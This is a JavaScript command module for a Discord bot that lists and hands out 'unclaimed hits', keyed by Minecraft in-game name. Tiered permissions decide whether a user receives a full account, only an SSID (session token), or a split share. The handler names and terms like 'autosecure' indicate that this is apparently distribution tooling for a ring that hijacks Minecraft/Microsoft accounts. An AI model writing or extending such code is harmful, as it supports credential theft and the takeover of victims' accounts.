const { ApplicationCommandOptionType } = require("discord.js");
const { queryParams } = require("../../../db/database");
const getUnclaimedMessage = require("../../utils/embeds/unclaimedMessage");
const { 
  handleAutosecureHit,
  handleBotOwnerClaim,
  handleFullAccount,
  handleSSIDOnly,
  handleSplitClaim
} = require("../../utils/bot/claimutils");
const { sendclaimownerembed } = require("../../../mainbot/utils/usernotifications")

module.exports = {
  name: "claim",
  description: 'claim or list unclaimed hits',
  options: [
    {
      name: "options",
      description: "Choose an option",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        {
          name: "Claim using username (user)",
          value: "claim"
        },
        {
          name: "List all unclaimed (user)",
          value: "list"
        },
        {
          name: "Accounts panel (owner)",
          value: "showaccs"
        }

      ]
    },
    {
      name: "ign",
      description: "The IGN of the account (only needed for claiming)",
      type: ApplicationCommandOptionType.String,
      required: false
    }
  ],
  callback: async (client, interaction) => {
    try {
      const action = interaction.options.getString("options");
      const isBotOwner = interaction.user.id === client.username;
      console.log(`client; ${client.username}`)
      let user = null;
      
      if (!isBotOwner) {
        user = await client.queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id]);
        
        if (user.length === 0) {
          console.log(`Unauthorized claim attempt by ${interaction.user.tag}`);
          return interaction.reply({ content: `You're not a user of this bot!`, ephemeral: true });
        }
        user = user[0];
        if (user.claiming === -1) {
          console.log(`User ${interaction.user.tag} tried claiming without permission`);
          return interaction.reply({ content: `You don't have access to claim hits!`, ephemeral: true });
        }
      }

      let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
      if (settings.length === 0) {
        console.log(`Server not configured for ${client.user.tag}`);
        return interaction.reply({ content: `This server isn't setup properly!`, ephemeral: true });
      }
      settings = settings[0];


      /// If tryna see accounts, show
      if (settings.claiming === 0 && action != "showaccs") {
        console.log(`Claiming disabled attempt by ${interaction.user.tag}`);
        return interaction.reply({ content: `Claiming is currently disabled!`, ephemeral: true });
      }

      let channelId, guildId = null;
      if (settings.logs_channel) {
        [channelId, guildId] = settings.logs_channel.split("|");
      } else {
        console.log(`No logs channel for ${client.user.tag}`);
        return interaction.reply({ 
          content: `Add a logs channel first!\nYour admins can do that using the command **/set**`, 
          ephemeral: true 
        });
      }

      if (action === "list") {
        try {
          const msg = await getUnclaimedMessage(client);
          return interaction.reply(msg);
        } catch (error) {
          console.log('List error:', error);
          return interaction.reply({ 
            content: `Failed to list unclaimed hits`, 
            ephemeral: true 
          });
        }
      } else if (action === "claim") {
        const name = interaction.options.getString("ign");
        if (!name) {
          console.log(`Claim attempt without IGN by ${interaction.user.tag}`);
          return interaction.reply({ content: `You need to provide an IGN to claim!`, ephemeral: true });
        }

        const hitData = await client.queryParams("SELECT * FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, name]);
        if (!hitData || hitData.length === 0) {
          console.log(`Hit not found for ${name}`);
          return interaction.reply({ content: `Couldn't find your hit!`, ephemeral: true });
        }
        const hit = JSON.parse(hitData[0].data);

        try {
          if (hit.embeds) {
            await handleAutosecureHit(client, interaction, hit, guildId, channelId, name, isBotOwner);
            await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, name]);
          } else {
            const { acc, uid, mcname } = hit;
            
            if (isBotOwner) {
              await handleBotOwnerClaim(client, interaction, acc, uid, guildId, channelId, name);
            } else if (user.split > 1) {
              await handleSplitClaim(client, interaction, acc, uid, guildId, channelId, name, user);
            } else if (user?.claiming === 1) {
              await handleFullAccount(client, interaction, acc, uid, guildId, channelId, name, user);
            } else {
              await handleSSIDOnly(client, interaction, acc, guildId, channelId, name, user);
            }


            await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, mcname]);
            await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, acc.oldName]);
          }
        
        } catch (error) {
          console.log('Claim processing error:', error);
          return interaction.reply({ 
            content: `Error processing claim`, 
            ephemeral: true 
          });
        }
      } else if (action === "showaccs") {
  if (interaction.user.id === client.username) {
    const msg = await sendclaimownerembed(client, "0");
    return interaction.reply(msg);
  } else {
    return interaction.reply({
      content: "You don't seem to have permissions for this :/",
      ephemeral: true
    });
  }
}
    } catch (error) {
      console.log('MAIN CLAIM ERROR:', error);
      return interaction.reply({ 
        content: `An error occurred`, 
        ephemeral: true 
      });
    }
  }
};